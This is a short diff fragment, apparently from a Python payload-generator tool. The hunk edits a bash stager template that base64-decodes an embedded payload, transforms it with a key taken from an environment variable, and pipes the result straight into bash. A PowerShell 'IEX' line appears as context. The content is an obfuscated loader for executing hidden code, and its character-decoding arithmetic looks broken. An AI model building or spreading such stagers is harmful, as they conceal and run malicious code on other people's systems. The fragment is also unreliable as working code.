@@ -71,7 +71,7 @@ IEX $Decoded
 PAYLOAD="{payload}"
 KEY="${{PAYLOAD_KEY:-}}"
 echo "$PAYLOAD" | base64 -d | while IFS= read -r -n1 c; do
-  printf "\\x$(printf '%02x' $((${{#c}} % ${#KEY})))"
+  printf "\\x$(printf '%02x' $((${{#c}} % ${{#KEY}})))"
 done | bash
 '''
 
